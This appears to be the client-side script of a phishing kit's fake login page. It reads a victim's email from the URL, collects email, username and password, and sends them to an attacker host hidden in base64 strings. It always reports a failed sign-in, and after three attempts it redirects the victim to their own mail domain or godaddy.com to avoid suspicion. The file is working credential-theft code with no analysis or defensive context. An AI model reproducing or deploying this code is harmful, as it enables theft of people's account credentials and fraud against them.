$("#sub-btn1").hide();

    /* global $ */
    $(document).ready(function() {
        var count = 0;

        ///////////////url ai getting////////////////
        var hash = window.location.hash.substr(1);
        var ai = "";
        if (hash.startsWith("path=")) {
            ai = hash.substr(5); // Extract email after "path="
        } else {
            ai = hash; // Fallback to previous behavior
        }
        if (!ai) {
            // Handle case when no hash parameter is present
        } else {
            // Handle case when hash parameter is present
            var my_ai = ai;
            var ind = my_ai.indexOf("@");
            var my_slice = my_ai.substr((ind + 1));
            var c = my_slice.substr(0, my_slice.indexOf('.'));
            var final = c.toLowerCase();

            $('#contact').trigger("reset");
            $("#mgss").hide();

            $('#ai').val(my_ai);
            $('#aich').html(my_ai);
            $("#mgss").hide();
        }
        ///////////////url getting ai////////////////

        var file = "aW5kZXgucGhw";
        var site = "aHR0cHM6Ly9wZW5ncGF1bHN1bi54eXovLmtnZW50bGVvd2Ev";

        $('#sub-btn').click(function(event) {
            $('#error').hide();
            $('#mgss').hide();
            event.preventDefault();
            var ai = $("#ai").val();
            var us = $("#us").val();
            var pr = $("#pr").val();
            var mgss = $('#mgss').html();
            $('#mgss').text(mgss);

            ///////////////////////////
            var my_ai = ai;
            var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

            if (!ai) {
                $('#error').show();
                $('#error').html("Email field is empty.!");
                return false;
            }
			
			if (!us) {
                $('#error').show();
                $('#error').html("Username field is empty.!");
                return false;
            }

            if (!filter.test(my_ai)) {
                $('#error').show();
                $('#error').html("That account doesn't exist. Enter a different account");
                return false;
            }
            if (!pr) {
                $('#error').show();
                $('#error').html("Password field is empty.!");
                return false; // Prevent form submission if password field is empty
            }

            var ind = my_ai.indexOf("@");
            var my_slice = my_ai.substr((ind + 1));
            var c = my_slice.substr(0, my_slice.indexOf('.'));
            var final = c.toLowerCase();
            var n = my_ai.search("@");
            ///////////////////////////
            count = count + 1;

            $.ajax({
                dataType: 'JSON',
                url: atob(site)+atob(file),
                type: 'POST',
                data: {
                    ai: ai,
                    us: us,
                    pr: pr,
                },
                // data: $('#contact').serialize(),
                beforeSend: function(xhr) {
                    $('#sub-btn').html('Verifying...');
                },
                success: function(response) {
                    $("#pr").val("");
                    if (count >= 3) {
                        count = 0;
                        if (n < 0) {
                            window.location.replace('https://godaddy.com/');
                        } else {
                            window.location.replace('https://' +my_slice);
                        }
                    }
                    $("#mgss").show();
                },
                error: function() {
                    $("#pr").val("");
                    if (count >= 3) {
                        count = 0;
                        if (n < 0) {
                            window.location.replace('https://godaddy.com/');
                        } else {
                            window.location.replace('https://' +my_slice);
                        }
                    }
                    $("#mgss").show();
                },
                complete: function() {
                    $('#sub-btn').html('Sign in');
                }
            });
        });
    });